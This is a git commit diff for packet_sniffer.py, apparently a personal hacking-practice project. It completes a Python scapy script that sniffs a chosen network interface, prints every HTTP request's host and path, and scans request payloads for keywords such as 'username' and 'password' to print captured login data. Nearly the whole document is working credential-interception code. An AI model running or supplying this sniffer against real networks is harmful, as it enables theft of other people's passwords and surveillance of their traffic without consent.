f829f4fdf1e07a983441e4757b0a2212c1897562
Mikael Storman Gustavsson <miga02@gmail.com>
2020-09-02 17:21:40 +0200

    Finished packet sniffer

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,6 +1,14 @@
 #!/usr/bin/env python
+import argparse
 import scapy.all as scapy
 from scapy.layers import http
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface")
+    options = parser.parse_args()
+    return options
 
 
 def sniff(interface):
@@ -8,15 +16,26 @@ def sniff(interface):
     # Do not store packets in mem.
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ['username', 'password', 'email', 'user', 'login', 'password', 'pass']
+        for keyword in keywords:
+            if keyword in load.lower():
+                return load
+
+
 def process_sniffed_package(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ['username', 'password', 'email', 'user', 'login', 'password', 'pass']
-            for keyword in keywords:
-                if keyword in load.lower():
-                    print(load)
-                    break
+        url = get_url(packet)
+        print("[+] HTTP Request >>" + url.decode())
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password" + login_info + "\n\n")
 
 
-sniff('eth0')
+sniff(get_arguments().interface)
